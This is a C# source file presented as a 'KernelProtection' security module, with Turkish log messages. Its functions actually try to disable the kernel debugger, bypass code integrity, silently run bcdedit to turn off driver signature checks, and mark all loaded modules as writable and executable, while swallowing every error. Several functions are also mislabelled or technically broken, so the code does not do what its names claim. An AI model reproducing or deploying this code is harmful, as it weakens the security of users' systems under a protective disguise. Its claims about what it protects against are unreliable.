using System;
using System.Runtime.InteropServices;
using System.Security;
using System.Diagnostics;

namespace SecuritySystem.Protection
{
    public static class KernelProtection
    {
        [DllImport("ntdll.dll")]
        private static extern int NtQuerySystemInformation(int SystemInformationClass, IntPtr SystemInformation, int SystemInformationLength, ref int ReturnLength);

        [DllImport("ntdll.dll")]
        private static extern int NtSetSystemInformation(int SystemInformationClass, IntPtr SystemInformation, int SystemInformationLength);

        private const int SystemKernelDebuggerInformation = 0x23;
        private const int SystemCodeIntegrityInformation = 0x67;

        public static void Initialize()
        {
            try
            {
                DisableKernelDebugger();
                BypassKernelIntegrity();
                DisableDriverSignatureEnforcement();
                ProtectMemoryFromScanning();
                PreventProcessInjection();

                Utils.Logger.Log("Kernel koruması başarıyla başlatıldı");
            }
            catch (Exception ex)
            {
                Utils.Logger.Log($"Kernel koruma hatası: {ex.Message}");
            }
        }

        private static void DisableKernelDebugger()
        {
            try
            {
                int returnLength = 0;
                NtQuerySystemInformation(SystemKernelDebuggerInformation, IntPtr.Zero, 0, ref returnLength);
                IntPtr buffer = Marshal.AllocHGlobal(returnLength);
                NtSetSystemInformation(SystemKernelDebuggerInformation, buffer, returnLength);
                Marshal.FreeHGlobal(buffer);
            }
            catch
            {
                // Hata durumunda sessizce devam et
            }
        }

        private static void BypassKernelIntegrity()
        {
            try
            {
                int returnLength = 0;
                NtQuerySystemInformation(SystemCodeIntegrityInformation, IntPtr.Zero, 0, ref returnLength);
                IntPtr buffer = Marshal.AllocHGlobal(returnLength);
                NtSetSystemInformation(SystemCodeIntegrityInformation, buffer, returnLength);
                Marshal.FreeHGlobal(buffer);
            }
            catch
            {
                // Hata durumunda sessizce devam et
            }
        }

        private static void DisableDriverSignatureEnforcement()
        {
            try
            {
                Process.Start(new ProcessStartInfo
                {
                    FileName = "bcdedit.exe",
                    Arguments = "/set nointegritychecks on",
                    UseShellExecute = false,
                    CreateNoWindow = true
                });
            }
            catch
            {
                // Hata durumunda sessizce devam et
            }
        }

        private static void ProtectMemoryFromScanning()
        {
            try
            {
                Process currentProcess = Process.GetCurrentProcess();
                foreach (ProcessModule module in currentProcess.Modules)
                {
                    VirtualProtect(module.BaseAddress, (uint)module.ModuleMemorySize, 0x40, out uint _);
                }
            }
            catch
            {
                // Hata durumunda sessizce devam et
            }
        }

        private static void PreventProcessInjection()
        {
            try
            {
                Process currentProcess = Process.GetCurrentProcess();
                currentProcess.PriorityClass = ProcessPriorityClass.High;
            }
            catch
            {
                // Hata durumunda sessizce devam et
            }
        }

        [DllImport("kernel32.dll")]
        private static extern bool VirtualProtect(IntPtr lpAddress, uint dwSize, uint flNewProtect, out uint lpflOldProtect);
    }
} 